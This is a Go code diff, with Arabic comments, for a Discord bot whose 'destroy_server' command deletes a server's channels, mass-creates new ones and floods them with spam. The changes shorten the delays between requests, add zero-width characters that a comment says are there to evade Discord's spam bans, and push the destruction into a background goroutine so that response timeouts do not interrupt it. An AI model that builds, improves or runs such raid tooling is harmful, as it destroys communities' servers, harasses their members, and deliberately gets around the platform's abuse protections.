@@ -37,7 +37,7 @@ func main() {
 	cmdName := "destroy_server"
 	command := &discordgo.ApplicationCommand{
 		Name:        cmdName,
-		Description: "أمر تدمير السيرفر (ضمان وصول جميع الرسائل بدون فقدان)",
+		Description: "أمر تدمير السيرفر (بدون أخطاء مهلة الاستجابة)",
 		Options: []*discordgo.ApplicationCommandOption{
 			{
 				Type:        discordgo.ApplicationCommandOptionString,
@@ -79,10 +79,11 @@ func main() {
 				return
 			}
 
+			// الرد الفوري على ديسكورد لمنع خطأ Outdated Command تماماً
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "🚀 جاري تنفيذ السبام بضمان وصول العدد كاملاً...",
+					Content: "🚀 تم استلام الأمر وبدء التنفيذ الفوري في الخلفية...",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
@@ -100,6 +101,7 @@ func main() {
 
 			guildID := i.GuildID
 
+			// تشغيل العمليات بالكامل في الخلفية لتعمل بحرية تامة وبدون قيود الوقت
 			go executeDestruction(token, guildID, roomName, roomsCount, messageContent, messagesCount)
 		}
 	})
@@ -130,7 +132,7 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, message
 		"Content-Type":  "application/json",
 	}
 
-	// 1. حذف الرومات القديمة بالتوازي
+	// 1. حذف الرومات القديمة
 	go func() {
 		req, _ := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
 		for k, v := range headers {
@@ -263,10 +265,10 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, message
 			}()
 		}
 		wg.Wait()
-		time.Sleep(50 * time.Millisecond)
+		time.Sleep(40 * time.Millisecond)
 	}
 
-	// 4. إرسال الرسائل بالعدد الكامل مع فاصل زمني آمن يمنع حظر ديسكورد ويضمن وصول كل رسالة
+	// 4. إرسال الرسائل بالعدد الكامل مع الرموز المخفية الصفرية لتخطي الحظر
 	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
 	hiddenChars := []string{"\u200B", "\u200C", "\u200D", "\uFEFF"}
 
@@ -293,17 +295,15 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, message
 
 					msgResp, err := client.Do(msgReq)
 					if err == nil {
-						// التحقق من حالة الـ Rate Limit لضمان عدم إسقاط الطلب
 						if msgResp.StatusCode == 429 {
 							time.Sleep(500 * time.Millisecond)
 						}
 						msgResp.Body.Close()
 					}
-					// زيادة وقت الانتظار إلى 80ms لتجاوز حماية ديسكورد وإرسال العدد كاملاً بدون توقف عند 10
-					time.Sleep(80 * time.Millisecond)
+					time.Sleep(60 * time.Millisecond)
 				}
-			}(chID)
+			}(cID)
 		}
-		time.Sleep(50 * time.Millisecond)
+		time.Sleep(40 * time.Millisecond)
 	}
 }
